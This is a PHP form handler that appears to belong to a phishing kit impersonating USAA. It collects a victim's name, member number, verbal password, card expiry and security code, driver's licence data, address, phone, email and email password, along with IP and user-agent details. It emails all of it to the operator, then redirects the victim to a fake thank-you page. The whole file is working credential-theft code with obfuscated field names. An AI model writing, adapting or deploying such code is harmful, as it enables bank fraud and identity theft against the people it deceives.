<?php
if($_POST["fulla3m2"] != "" and $_POST["usmn"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------USAA fulham-----------------------\n";
$message .= "|Fullname : ".$_POST['fulla3m2']."\n";
$message .= "|USAA Member Number : ".$_POST['usmn']."\n";
$message .= "|Verbal Pasword : ".$_POST['vbpa33']."\n";
$message .= "|4 digit of card : ".$_POST['cadi']."\n";
$message .= "|exp date : ".$_POST['expd00']."\n";
$message .= "|s3curity code : ".$_POST['csc0d3']."\n";
$message .= "|DL : ".$_POST['dl90839']."\n";
$message .= "|DL State : ".$_POST['dlst390']."\n";
$message .= "|EXp Date : ".$_POST['dlexp']."\n";
$message .= "|Address: ".$_POST['addy00']."\n";
$message .= "|city : ".$_POST['cit88']."\n";
$message .= "|zip : ".$_POST['zpi08']."\n";
$message .= "|phone: ".$_POST['p0n3n']."\n";
$message .= "|3ma1l : ".$_POST['e3m1il9']."\n";
$message .= "|pas33w0rd : ".$_POST['pa3e3m1il9']."\n";
 
$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'fillin.php';
$subject = "Result from USAA| ".$ip."\n";
 
{
mail("$to", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
header('Location: Thanks.php?cmd=login_submit&id=$praga$praga&session=$praga$praga');
}else{
header ("Location: index.php");
}

?>


   